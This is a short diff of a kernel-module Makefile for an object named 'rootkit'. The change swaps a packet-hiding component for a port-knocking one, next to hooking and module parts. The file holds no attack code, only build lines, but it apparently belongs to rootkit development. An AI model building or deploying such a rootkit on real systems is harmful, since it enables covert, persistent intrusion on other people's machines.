@@ -1,6 +1,6 @@
 obj-m = rootkit.o
 
-rootkit-objs += packet_hiding.o
+rootkit-objs += port_knocking.o
 rootkit-objs += hooking.o
 rootkit-objs += mod.o
 
